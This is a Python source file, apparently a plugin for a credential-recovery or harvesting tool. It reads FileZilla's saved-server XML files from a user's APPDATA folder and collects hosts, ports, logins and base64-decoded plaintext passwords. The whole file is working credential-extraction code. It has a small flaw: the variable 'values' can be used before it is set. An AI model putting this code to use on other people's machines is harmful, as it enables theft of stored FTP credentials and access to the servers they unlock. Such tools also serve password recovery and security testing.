# -*- coding: utf-8 -*-
import base64
import os

from xml.etree.cElementTree import ElementTree


class Filezilla:
    def run(self, profile):
        path = os.path.join(profile['APPDATA'], 'FileZilla')
        if not os.path.exists(path):
            return
        pwd_found = []
        for file in ['sitemanager.xml', 'recentservers.xml', 'filezilla.xml']:

            xml_file = os.path.join(path, file)
            if os.path.exists(xml_file):
                tree = ElementTree(file=xml_file)
                if tree.findall('Servers/Server'):
                    servers = tree.findall('Servers/Server')
                else:
                    servers = tree.findall('RecentServers/Server')

                for server in servers:
                    host = server.find('Host')
                    port = server.find('Port')
                    login = server.find('User')
                    password = server.find('Pass')

                    # if all((host, port, login)) does not work
                    if host is not None and port is not None and login is not None:
                        values = {'Host': host.text, 'Port': port.text, 'Login': login.text}

                    if password is not None:
                        if 'encoding' in password.attrib and password.attrib['encoding'] == 'base64':
                            values['Password'] = base64.b64decode(password.text)
                        else:
                            values['Password'] = password.text

                    if values:
                        pwd_found.append(values)

        return pwd_found


modules = {"Filezilla": Filezilla()}
